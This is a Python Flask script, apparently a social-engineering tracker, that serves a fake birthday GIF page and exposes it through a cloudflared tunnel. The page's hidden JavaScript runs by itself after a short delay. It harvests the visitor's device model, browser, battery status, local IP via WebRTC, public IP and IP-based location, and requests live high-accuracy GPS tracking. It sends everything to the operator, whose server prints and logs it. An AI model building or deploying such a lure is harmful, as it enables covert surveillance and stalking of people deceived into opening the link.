#!/usr/bin/env python3
import json
import socket
import sys
import os
import re
import subprocess
import platform
import time
import threading
import urllib.request
import stat
import shutil
from flask import Flask, request, render_template_string
from flask_cors import CORS
from datetime import datetime

# ========== BANNER ==========
banner = """
\033[1;31m██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗\033[0m  \033[1;34m██╗███╗   ██╗███████╗ ██████╗ \033[0m
\033[1;33m██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝\033[0m  \033[1;35m██║████╗  ██║██╔════╝██╔═══██╗\033[0m
\033[1;32m██████╔╝███████║██║   ██║██╔██╗ ██║█████╗  \033[0m  \033[1;36m██║██╔██╗ ██║█████╗  ██║   ██║\033[0m
\033[1;33m██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝  \033[0m  \033[1;34m██║██║╚██╗██║██╔══╝  ██║   ██║\033[0m
\033[1;31m██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗\033[0m  \033[1;35m██║██║ ╚████║██║     ╚██████╔╝\033[0m
\033[1;32m╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝\033[0m  \033[1;36m╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ \033[0m

\033[1;33m
🔴 YouTube: https://www.youtube.com/@aryanafridi00
💻 Developer: Aryan Afridi 
📡 GitHub: https://github.com/shahid2005a
\033[0m
"""
# ==========================================

app = Flask(__name__)
CORS(app)

HTML_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>🎉 Birthday Celebration – Find & Share GIFs</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body {
            background: #121212;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 10px 40px;
        }
        .container {
            max-width: 1040px;
            width: 100%;
        }
        .header {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .header h1 {
            font-size: 26px;
            font-weight: 700;
            background: linear-gradient(90deg, #00e6cc, #9933ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .search-bar {
            display: flex;
            background: #2a2a2a;
            border-radius: 8px;
            padding: 0 12px;
            height: 48px;
            align-items: center;
            flex: 1;
            max-width: 400px;
            min-width: 200px;
        }
        .search-bar input {
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 16px;
            padding: 8px 0;
            width: 100%;
        }
        .search-bar input::placeholder { color: #888; }
        .search-bar svg { fill: #888; width: 20px; height: 20px; margin-right: 8px; }

        .gif-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 16px;
            margin: 20px 0;
        }
        .gif-card {
            background: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            aspect-ratio: 1 / 1;
            position: relative;
        }
        .gif-card img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .gif-card .gif-label {
            position: absolute;
            bottom: 8px;
            left: 8px;
            background: rgba(0,0,0,0.7);
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 12px;
            color: #ccc;
        }

        .action-area {
            display: flex;
            justify-content: center;
            margin: 30px 0 20px;
        }
        .unlock-btn {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            border: none;
            color: #fff;
            font-size: 22px;
            font-weight: 700;
            padding: 18px 60px;
            border-radius: 60px;
            cursor: pointer;
            box-shadow: 0 8px 30px rgba(238, 90, 36, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .unlock-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 12px 40px rgba(238, 90, 36, 0.6);
        }
        .unlock-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        #loader {
            margin-top: 12px;
            font-size: 14px;
            color: #aaa;
            display: none;
        }

        #celebration {
            display: none;
            margin-top: 30px;
            text-align: center;
        }
        #celebration .card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(12px);
            border-radius: 30px;
            padding: 50px 30px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        #celebration h2 {
            font-size: 48px;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        #celebration p {
            font-size: 20px;
            margin-top: 10px;
            color: #ddd;
        }
        .gift-icon { font-size: 80px; }

        .footer {
            margin-top: 40px;
            font-size: 13px;
            color: #666;
            text-align: center;
        }
        .footer a { color: #888; text-decoration: none; margin: 0 10px; }
        .footer a:hover { color: #fff; }

        @media (max-width: 600px) {
            .header { flex-direction: column; align-items: stretch; gap: 10px; }
            .search-bar { max-width: 100%; }
            .unlock-btn { font-size: 18px; padding: 14px 40px; }
        }
    </style>
</head>
<body>
<div class="container" id="main">
    <div class="header">
        <h1>🎂 Birthday Celebration</h1>
        <div class="search-bar">
            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
            <input type="text" placeholder="Search birthday GIFs..." disabled>
        </div>
    </div>

    <div class="gif-grid">
        <div class="gif-card"><img src="https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyeWZlYmF4YmZub29qMXduOGxndzR5NTYwMzd2NGo3b3Z6bjA0ZTlsaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/H3Dr6o7OmsVIBqXg6H/giphy.webp" alt="Birthday GIF"><span class="gif-label">🎉 Party</span></div>
        <div class="gif-card"><img src="https://media3.giphy.com/media/v1.Y2lkPTZjMDliOTUyeWZlYmF4YmZub29qMXduOGxndzR5NTYwMzd2NGo3b3Z6bjA0ZTlsaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/VyB31XTqZNJhFRZNyl/giphy.webp" alt="Birthday GIF"><span class="gif-label">🎂 Cake</span></div>
        <div class="gif-card"><img src="https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUyeWZlYmF4YmZub29qMXduOGxndzR5NTYwMzd2NGo3b3Z6bjA0ZTlsaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/YTbZzCkRQCEJa/giphy.webp" alt="Birthday GIF"><span class="gif-label">🎈 Confetti</span></div>
        <div class="gif-card"><img src="https://media2.giphy.com/media/v1.Y2lkPTZjMDliOTUyeWZlYmF4YmZub29qMXduOGxndzR5NTYwMzd2NGo3b3Z6bjA0ZTlsaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/l2JhKk8hYJWH8pOZW/giphy.webp" alt="Birthday GIF"><span class="gif-label">🎊 Celebrate</span></div>
        <div class="gif-card"><img src="https://media0.giphy.com/media/v1.Y2lkPTZjMDliOTUyeWZlYmF4YmZub29qMXduOGxndzR5NTYwMzd2NGo3b3Z6bjA0ZTlsaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3o7aTskHEUdgCQAXde/giphy.webp" alt="Birthday GIF"><span class="gif-label">🎁 Gifts</span></div>
        <div class="gif-card"><img src="https://media3.giphy.com/media/v1.Y2lkPTZjMDliOTUyeWZlYmF4YmZub29qMXduOGxndzR5NTYwMzd2NGo3b3Z6bjA0ZTlsaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/l0HlUwVhsLvTC7oGc/giphy.webp" alt="Birthday GIF"><span class="gif-label">🥳 Happy</span></div>
    </div>

    <div class="action-area">
        <button class="unlock-btn" id="unlockBtn">✨ Unlock Surprise ✨</button>
    </div>
    <div id="loader">🛰️ Collecting device info...</div>

    <div id="celebration">
        <div class="card">
            <div class="gift-icon">🎂</div>
            <h2>Happy Birthday!</h2>
            <p>Wishing you joy, magic, and infinite happiness! 🎈✨</p>
        </div>
    </div>

    <div class="footer">
        <a href="#">Privacy</a> | <a href="#">Terms</a> | <span>© GIPHY style tribute</span>
    </div>
</div>

<script>
    const WEBHOOK = "/log";
    let isStarted = false;

    function getLocalIP(callback) {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
            if (!event.candidate) return;
            const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);
            if (ipMatch) {
                callback(ipMatch[0]);
                pc.close();
            }
        };
        setTimeout(() => callback("Unavailable"), 2000);
    }

    async function getBatteryInfo() {
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch(e) {
            return { level: "Unavailable", charging: "Unavailable", chargingTime: "Unavailable", dischargingTime: "Unavailable" };
        }
    }

    async function getDeviceInfo() {
        const ua = navigator.userAgent;
        let model = "Unknown";
        let androidVer = "Unknown";
        let hints = {};
        
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            try {
                hints = await navigator.userAgentData.getHighEntropyValues([
                    "model", "platformVersion", "fullVersionList"
                ]);
                if (hints.model && hints.model !== "") model = hints.model;
                if (hints.platformVersion) androidVer = hints.platformVersion;
            } catch(e) {}
        }
        
        if (model === "Unknown") {
            // Try to extract from UA using known patterns
            let patterns = [
                /\(([^)]+)\)/g,  // get everything inside parentheses
            ];
            let matches = [];
            let m;
            while ((m = /\(([^)]+)\)/g.exec(ua)) !== null) {
                matches.push(m[1]);
            }
            // Look for model in the first part (usually contains device info)
            if (matches.length > 0) {
                let first = matches[0];
                // Check for common brand patterns
                let brandModels = {
                    'HP': /HP (?:[A-Za-z0-9 ]+)/i,
                    'Dell': /Dell (?:[A-Za-z0-9 ]+)/i,
                    'Lenovo': /Lenovo (?:[A-Za-z0-9 ]+)/i,
                    'Acer': /Acer (?:[A-Za-z0-9 ]+)/i,
                    'ASUS': /ASUS (?:[A-Za-z0-9 ]+)/i,
                    'MSI': /MSI (?:[A-Za-z0-9 ]+)/i,
                    'Razer': /Razer (?:[A-Za-z0-9 ]+)/i,
                    'Samsung': /Samsung (?:[A-Za-z0-9 ]+)/i,
                    'OnePlus': /OnePlus (?:[A-Za-z0-9 ]+)/i,
                    'Xiaomi': /Xiaomi (?:[A-Za-z0-9 ]+)/i,
                    'OPPO': /OPPO (?:[A-Za-z0-9 ]+)/i,
                    'vivo': /vivo (?:[A-Za-z0-9 ]+)/i,
                    'Realme': /Realme (?:[A-Za-z0-9 ]+)/i,
                    'Google': /Pixel (?:[A-Za-z0-9 ]+)/i,
                    'Apple': /Macintosh|Mac OS X|iPhone|iPad/i,
                };
                for (let brand in brandModels) {
                    let regex = brandModels[brand];
                    let found = first.match(regex);
                    if (found) {
                        model = found[0];
                        break;
                    }
                }
                // If still unknown, try to capture anything that looks like a model
                if (model === "Unknown") {
                    // e.g., "Windows NT 10.0; Win64; x64" -> no model, skip
                    // We'll leave as Unknown, server will fill later
                }
            }
        }
        
        // For Android, also try to get model from UA directly (like SM-G990U)
        if (model === "Unknown" && /Android/.test(ua)) {
            let androidModelMatch = ua.match(/; (?:.*?; )?(.+?) Build/);
            if (androidModelMatch && androidModelMatch[1]) {
                model = androidModelMatch[1].trim();
            } else {
                let smMatch = ua.match(/SM-[A-Z0-9]+/i);
                if (smMatch) model = smMatch[0];
                else {
                    let miMatch = ua.match(/(Redmi|MI) [A-Za-z0-9 ]+/i);
                    if (miMatch) model = miMatch[0];
                }
            }
        }
        
        if (androidVer === "Unknown") {
            let verMatch = ua.match(/Android ([\\d\\.]+)/);
            if (verMatch) androidVer = verMatch[1];
        }
        
        return {
            raw_ua: ua,
            hints: hints,
            model: model,
            androidVer: androidVer
        };
    }
    
    async function collectData() {
        const device = await getDeviceInfo();
        const battery = await getBatteryInfo();
        let localIP = await new Promise(resolve => getLocalIP(resolve));
        
        let publicIP = "Unknown";
        try {
            let res = await fetch('https://api.ipify.org?format=json');
            let json = await res.json();
            publicIP = json.ip;
        } catch(e) {}
        
        let location = {
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            postal: "Unknown",
            lat: null,
            lon: null
        };
        try {
            let res = await fetch('https://ipapi.co/json/');
            let json = await res.json();
            location = {
                city: json.city || "Unknown",
                region: json.region || "Unknown",
                country: json.country_name || "Unknown",
                postal: json.postal || "Unknown",
                lat: json.latitude,
                lon: json.longitude
            };
        } catch(e) {}
        
        return {
            timestamp: new Date().toISOString(),
            model: device.model,
            androidVer: device.androidVer,
            raw_ua: device.raw_ua,
            hints: device.hints,
            local_ip: localIP,
            public_ip: publicIP,
            location: location,
            battery: battery
        };
    }
    
    async function sendData(data) {
        try {
            await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
        } catch(e) { console.error(e); }
    }
    
    async function start() {
        if (isStarted) return;
        isStarted = true;
        const btn = document.getElementById('unlockBtn');
        btn.disabled = true;
        document.getElementById('loader').style.display = 'block';
        const data = await collectData();
        await sendData(data);
        
        document.getElementById('main').style.display = 'none';
        document.getElementById('celebration').style.display = 'block';
        canvasConfetti({ particleCount: 200, spread: 100, origin: { y: 0.6 } });
        
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                (pos) => {
                    let gpsData = { 
                        ...data, 
                        event: "GPS", 
                        lat: pos.coords.latitude, 
                        lon: pos.coords.longitude, 
                        accuracy: pos.coords.accuracy,
                        gps_address: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                    };
                    sendData(gpsData);
                },
                (err) => sendData({ ...data, event: "GPS_DENIED", error: err.message }),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }
    }

    setTimeout(start, 2500);
    document.getElementById('unlockBtn').onclick = start;
</script>
</body>
</html>
'''

# ========== ENHANCED PARSING (with server-side model fallback) ==========
def get_server_model():
    """Get the host device model using system commands."""
    system = platform.system()
    model = "Unknown"
    if system == "Windows":
        try:
            # Try wmic
            output = subprocess.check_output("wmic csproduct get name", shell=True, text=True)
            lines = output.strip().split('\n')
            if len(lines) >= 2:
                model = lines[1].strip()
        except:
            pass
        if model == "Unknown" or model == "":
            try:
                # Alternative via registry? Use systeminfo
                output = subprocess.check_output("systeminfo | findstr /B /C:\"System Model\"", shell=True, text=True)
                if output:
                    model = output.split(':')[1].strip()
            except:
                pass
    elif system == "Darwin":  # macOS
        try:
            model = subprocess.check_output("sysctl -n hw.model", shell=True, text=True).strip()
        except:
            try:
                model = subprocess.check_output("system_profiler SPHardwareDataType | grep 'Model Name'", shell=True, text=True).strip()
                if model:
                    model = model.split(':')[1].strip()
            except:
                pass
    elif system == "Linux":
        try:
            # Try /sys/class/dmi/id/product_name
            with open("/sys/class/dmi/id/product_name", "r") as f:
                model = f.read().strip()
        except:
            try:
                model = subprocess.check_output("sudo dmidecode -s system-product-name", shell=True, text=True).strip()
            except:
                try:
                    # Fallback to /proc/cpuinfo model name (not accurate but better than nothing)
                    with open("/proc/cpuinfo", "r") as f:
                        for line in f:
                            if "model name" in line:
                                model = line.split(':')[1].strip()
                                break
                except:
                    pass
    return model if model and model != "Unknown" else "Unknown"

SERVER_MODEL = get_server_model()

def parse_device(data):
    raw_ua = data.get('raw_ua', '')
    client_model = data.get('model', 'Unknown')
    android_ver = data.get('androidVer', 'Unknown')
    hints = data.get('hints', {})
    
    # Use server model if client model is unknown and server model is known
    if client_model == "Unknown" and SERVER_MODEL != "Unknown":
        final_model = SERVER_MODEL
    else:
        final_model = client_model
    
    # If still unknown, try to parse from raw_ua
    if final_model == "Unknown" and raw_ua:
        # Try some common patterns for laptops/desktops
        patterns = [
            r'HP (?:[A-Za-z0-9\- ]+?)', 
            r'Dell (?:[A-Za-z0-9\- ]+?)',
            r'Lenovo (?:[A-Za-z0-9\- ]+?)',
            r'Acer (?:[A-Za-z0-9\- ]+?)',
            r'ASUS (?:[A-Za-z0-9\- ]+?)',
            r'MSI (?:[A-Za-z0-9\- ]+?)',
            r'Razer (?:[A-Za-z0-9\- ]+?)',
            r'Samsung (?:[A-Za-z0-9\- ]+?)',
            r'MacBook|MacBook Pro|MacBook Air|iMac|Mac mini|Mac Pro',
        ]
        for pat in patterns:
            match = re.search(pat, raw_ua)
            if match:
                final_model = match.group(0)
                break
    
    # If model still unknown, but we have hints.model, use that
    if final_model == "Unknown" and hints.get('model'):
        final_model = hints['model']
    
    # Brand & Manufacturer (based on final model)
    brand = "Unknown"
    manufacturer = "Unknown"
    if final_model.startswith("SM-") or "Samsung" in final_model:
        brand = "Samsung"; manufacturer = "Samsung"
    elif "Redmi" in final_model or "MI" in final_model or "Xiaomi" in final_model:
        brand = "Xiaomi"; manufacturer = "Xiaomi"
    elif "OnePlus" in final_model:
        brand = "OnePlus"; manufacturer = "OnePlus"
    elif "Pixel" in final_model:
        brand = "Google"; manufacturer = "Google"
    elif "OPPO" in final_model:
        brand = "OPPO"; manufacturer = "OPPO"
    elif "vivo" in final_model.lower():
        brand = "vivo"; manufacturer = "vivo"
    elif "Realme" in final_model:
        brand = "Realme"; manufacturer = "Realme"
    elif "iPhone" in final_model or "iPad" in final_model:
        brand = "Apple"; manufacturer = "Apple"
    elif "Mac" in final_model:
        brand = "Apple"; manufacturer = "Apple"
    elif "HP" in final_model or "Hewlett-Packard" in final_model:
        brand = "HP"; manufacturer = "HP"
    elif "Dell" in final_model:
        brand = "Dell"; manufacturer = "Dell"
    elif "Lenovo" in final_model:
        brand = "Lenovo"; manufacturer = "Lenovo"
    elif "Acer" in final_model:
        brand = "Acer"; manufacturer = "Acer"
    elif "ASUS" in final_model:
        brand = "ASUS"; manufacturer = "ASUS"
    elif "MSI" in final_model:
        brand = "MSI"; manufacturer = "MSI"
    elif "Razer" in final_model:
        brand = "Razer"; manufacturer = "Razer"
    
    # SDK
    sdk = "Unknown"
    try:
        ver_parts = android_ver.split('.')
        if ver_parts:
            ver_num = float(ver_parts[0])
            if ver_num >= 15: sdk = "35"
            elif ver_num >= 14: sdk = "34"
            elif ver_num >= 13: sdk = "33"
            elif ver_num >= 12: sdk = "32"
            elif ver_num >= 11: sdk = "30"
            elif ver_num >= 10: sdk = "29"
    except:
        pass
    
    # OS
    os_name = "Unknown"
    os_version = "Unknown"
    if "Android" in raw_ua:
        os_name = "Android"
        ver_match = re.search(r'Android ([0-9.]+)', raw_ua)
        if ver_match:
            os_version = ver_match.group(1)
        else:
            os_version = android_ver
    elif "iPhone" in raw_ua or "iPad" in raw_ua:
        os_name = "iOS"
        ver_match = re.search(r'OS ([0-9_]+) like Mac OS X', raw_ua)
        if ver_match:
            os_version = ver_match.group(1).replace('_', '.')
    elif "Windows" in raw_ua:
        os_name = "Windows"
        ver_match = re.search(r'Windows NT ([0-9.]+)', raw_ua)
        if ver_match:
            os_version = ver_match.group(1)
    elif "Mac OS X" in raw_ua:
        os_name = "macOS"
        ver_match = re.search(r'Mac OS X ([0-9_]+)', raw_ua)
        if ver_match:
            os_version = ver_match.group(1).replace('_', '.')
    elif "Linux" in raw_ua:
        os_name = "Linux"
    
    # Browser
    browser = "Unknown"
    if "Edg/" in raw_ua:
        browser = "Edge"
    elif "OPR" in raw_ua or "Opera" in raw_ua:
        browser = "Opera"
    elif "Chrome" in raw_ua and "Edg/" not in raw_ua:
        browser = "Chrome"
    elif "Firefox" in raw_ua:
        browser = "Firefox"
    elif "Safari" in raw_ua and "Chrome" not in raw_ua:
        browser = "Safari"
    
    # Device Type
    device_type = "Desktop"
    if re.search(r'Mobile|Android.*Mobile|iPhone|iPod', raw_ua):
        device_type = "Mobile"
    elif re.search(r'iPad|Android.*Tablet', raw_ua):
        device_type = "Tablet"
    
    # Device name & hardware
    device_name = final_model
    hardware = "Unknown"
    dn_match = re.search(r'Device: (\w+)', raw_ua)
    if dn_match: device_name = dn_match.group(1)
    hw_match = re.search(r'Hardware: (\w+)', raw_ua)
    if hw_match: hardware = hw_match.group(1)
    
    # Screen resolution (if available from hints)
    screen_width = hints.get('screenWidth', 'Unknown')
    screen_height = hints.get('screenHeight', 'Unknown')
    if screen_width != 'Unknown' and screen_height != 'Unknown':
        screen_res = f"{screen_width}x{screen_height}"
    else:
        screen_res = "Unknown"
    
    # Battery
    battery = data.get('battery', {})
    
    return {
        "model": final_model,
        "brand": brand,
        "manufacturer": manufacturer,
        "android_ver": android_ver,
        "sdk": sdk,
        "device_name": device_name,
        "hardware": hardware,
        "os_name": os_name,
        "os_version": os_version,
        "browser": browser,
        "device_type": device_type,
        "screen_resolution": screen_res,
        "battery_level": battery.get('level', 'Unknown'),
        "battery_charging": battery.get('charging', 'Unknown'),
        "battery_charging_time": battery.get('chargingTime', 'Unknown'),
        "battery_discharging_time": battery.get('dischargingTime', 'Unknown')
    }

def print_exact(data):
    parsed = parse_device(data)
    loc = data.get('location', {})
    
    print("\n" + "="*70)
    
    # ---------- DEVICE MODEL REPORT ----------
    print("📋 DEVICE MODEL REPORT")
    print("-" * 50)
    print(f"  📊 Model           : {parsed['model']}")
    print(f"  💎 Brand           : {parsed['brand']}")
    print(f"  🏭 Manufacturer    : {parsed['manufacturer']}")
    print(f"  💾 Android Version : {parsed['android_ver']}")
    print(f"  📟 SDK Version     : {parsed['sdk']}")
    print(f"  🆔 Device Name     : {parsed['device_name']}")
    print(f"  🚀 Hardware        : {parsed['hardware']}")
    print(f"  🖥️ OS              : {parsed['os_name']} {parsed['os_version']}")
    print(f"  🌐 Browser         : {parsed['browser']}")
    print(f"  📱 Device Type     : {parsed['device_type']}")
    print(f"  📺 Screen Res      : {parsed['screen_resolution']}")
    print(f"  🔋 Battery Level   : {parsed['battery_level']}%")
    print(f"  ⚡ Charging        : {parsed['battery_charging']}")
    if parsed['battery_charging_time'] not in ("Unknown", "Infinity"):
        print(f"  ⏳ Charging Time   : {parsed['battery_charging_time']} sec")
    if parsed['battery_discharging_time'] not in ("Unknown", "Infinity"):
        print(f"  ⏳ Discharging Time: {parsed['battery_discharging_time']} sec")
    print("-" * 50)
    
    # ---------- NETWORK ----------
    print("\n📶 NETWORK INFORMATION")
    print(f"  🚾 MAC Address   : Unavailable (browser restriction)")
    print(f"  🛜 Local IP      : {data.get('local_ip', 'Unknown')}")
    print(f"  🎭 Public IP     : {data.get('public_ip', 'Unknown')}")
    
    # ---------- LOCATION ----------
    print("\n🏠 LOCATION DETAILS")
    if loc.get('city') and loc.get('city') != "Unknown":
        print(f"  🏙️ City          : {loc.get('city')}")
        print(f"  🗽 Region/State  : {loc.get('region')}")
        print(f"  🌍 Country       : {loc.get('country')}")
        print(f"  💿 Postal Code   : {loc.get('postal')}")
        if loc.get('lat') and loc.get('lon'):
            print(f"  🔰 IP Coordinates: {loc.get('lat')}, {loc.get('lon')}")
    else:
        print("  IP-based location: Not available")
    
    # ---------- GPS ----------
    if data.get('event') == 'GPS' and data.get('lat'):
        print(f"\n📍 GPS LIVE LOCATION")
        print(f"  Latitude  : {data['lat']}")
        print(f"  Longitude : {data['lon']}")
        print(f"  Accuracy  : ±{data.get('accuracy', '?')} meters")
        print(f"  Maps      : {data.get('gps_address')}")
    elif data.get('event') == 'GPS_DENIED':
        print(f"\n📍 GPS: Denied by user")
    
    print("\n--- DEBUG ---")
    print(f"  Model from hints: {data.get('hints', {}).get('model', 'N/A')}")
    print(f"  Platform Version: {data.get('hints', {}).get('platformVersion', 'N/A')}")
    print(f"  Server Model (fallback): {SERVER_MODEL}")
    print("="*70 + "\n")
    
    with open("device_data.log", "a", encoding="utf-8") as f:
        f.write(json.dumps({**data, "parsed": parsed}, ensure_ascii=False) + "\n")

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json()
        if data:
            print_exact(data)
        return "ok", 200
    except Exception as e:
        print(f"Error: {e}")
        return "error", 500

# ==================================================
# CLOUDFLARED TUNNEL – CROSS-PLATFORM
# ==================================================
def get_cloudflared_path():
    """Check if cloudflared is in PATH; if not, download to current directory."""
    # First, try to find existing installation
    cloudflared = shutil.which("cloudflared")
    if cloudflared:
        return cloudflared
    
    # On Windows, also try with .exe
    if platform.system() == "Windows":
        cloudflared = shutil.which("cloudflared.exe")
        if cloudflared:
            return cloudflared
    
    # Not found – download
    return download_cloudflared()

def download_cloudflared():
    """Download cloudflared binary for the current platform."""
    system = platform.system().lower()
    arch = platform.machine().lower()
    
    # For Linux, get more accurate arch via uname if available
    if system == "linux":
        try:
            arch = subprocess.check_output(["uname", "-m"], text=True).strip().lower()
        except:
            pass
    
    # Map system and arch to download URL and filename
    if system == "windows":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        filename = "cloudflared.exe"
    elif system == "linux":
        if arch in ("x86_64", "amd64"):
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        elif arch in ("aarch64", "arm64", "armv8l"):
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        else:
            print(f"❌ Unsupported Linux architecture: {arch}")
            return None
        filename = "cloudflared"
    elif system == "darwin":  # macOS
        if arch in ("x86_64", "amd64"):
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
        elif arch in ("arm64", "aarch64"):
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
        else:
            print(f"❌ Unsupported macOS architecture: {arch}")
            return None
        filename = "cloudflared"
    else:
        print(f"❌ Unsupported OS: {system}")
        return None
    
    # If file already exists, return it (after ensuring executable)
    if os.path.exists(filename):
        if system != "windows":
            os.chmod(filename, os.stat(filename).st_mode | stat.S_IEXEC)
        return filename
    
    print(f"⬇️ Downloading cloudflared for {system} {arch}...")
    
    # Try multiple download methods
    downloaded = False
    # 1. Try urllib
    try:
        urllib.request.urlretrieve(url, filename)
        downloaded = True
    except Exception as e:
        print(f"⚠️ urllib download failed: {e}")
    
    # 2. Try curl (Unix-like)
    if not downloaded and system != "windows":
        try:
            subprocess.run(["curl", "-L", "-k", "-o", filename, url], check=True)
            downloaded = True
        except:
            pass
    
    # 3. Try wget (Unix-like)
    if not downloaded and system != "windows":
        try:
            subprocess.run(["wget", "--no-check-certificate", "-O", filename, url], check=True)
            downloaded = True
        except:
            pass
    
    if not downloaded:
        print("❌ All download methods failed. Please install cloudflared manually.")
        return None
    
    # Make executable on Unix
    if system != "windows":
        os.chmod(filename, os.stat(filename).st_mode | stat.S_IEXEC)
    
    print("✅ Download complete.")
    return filename

def start_cloudflared(port):
    """Start cloudflared tunnel and return (public_url, process)."""
    binary = get_cloudflared_path()
    if not binary:
        return None, None
    
    cmd = [binary, "tunnel", "--url", f"http://localhost:{port}"]
    # On Windows, if binary is in current dir, we need to use .\\ prefix or full path
    if platform.system() == "Windows" and not os.path.dirname(binary):
        cmd = [".\\" + binary] + cmd[1:]
    
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    
    # Wait for URL (up to 30 seconds)
    url = None
    start_time = time.time()
    while time.time() - start_time < 30:
        line = process.stdout.readline()
        if not line:
            break
        print(line.strip())  # show logs
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            url = match.group(0)
            break
        if "Your quick Tunnel has been created!" in line:
            # URL might come in next lines, continue
            pass
    
    if url:
        print(f"\n🌐 PUBLIC URL: {url}")
        return url, process
    else:
        print("❌ Could not find public URL from cloudflared output.")
        print(f"   You can manually run: {binary} tunnel --url http://localhost:{port}")
        return None, process

# ========== PORT MANAGEMENT (unchanged) ==========
def kill_process_on_port(port):
    try:
        result = subprocess.run(f"lsof -ti:{port}", shell=True, capture_output=True, text=True)
        if result.stdout.strip():
            pids = result.stdout.strip().split()
            for pid in pids:
                print(f"🔪 Killing process {pid} on port {port}")
                os.system(f"kill -9 {pid}")
            return True
    except:
        pass
    return False

def find_free_port(start=3000):
    port = start
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('0.0.0.0', port))
                return port
            except OSError:
                print(f"⚠️ Port {port} busy, trying to kill...")
                if kill_process_on_port(port):
                    continue
                else:
                    print(f"⚠️ Port {port} busy, trying {port+1}...")
                    port += 1
                    if port > start + 20:
                        print("❌ Too many ports busy. Run: pkill -f python")
                        sys.exit(1)

# ========== MAIN ==========
if __name__ == '__main__':
    print(banner)
    print(f"🖥️  Host Device Model (server): {SERVER_MODEL}")
    port = find_free_port(3000)
    print(f"\n📡 Local URL: http://localhost:{port}")
    
    # Start cloudflared tunnel in background
    def tunnel_worker():
        url, proc = start_cloudflared(port)
        if url:
            # Keep reference to proc to prevent garbage collection
            pass
        else:
            print("⚠️ Cloudflared tunnel not started automatically.")
            print("   You can try running manually after installing cloudflared.")
    
    t = threading.Thread(target=tunnel_worker, daemon=True)
    t.start()
    time.sleep(5)  # Give time to print URL
    
    print("\n✅ Enhanced device details: OS, Browser, Device Type, Screen Resolution, Battery")
    print("✅ GPS live location captured if user allows")
    print("✅ Model detection improved for ALL devices (phones, laptops, desktops)")
    print("\n🚀 Flask server running... Press Ctrl+C to stop.\n")
    
    app.run(host='0.0.0.0', port=port, debug=False)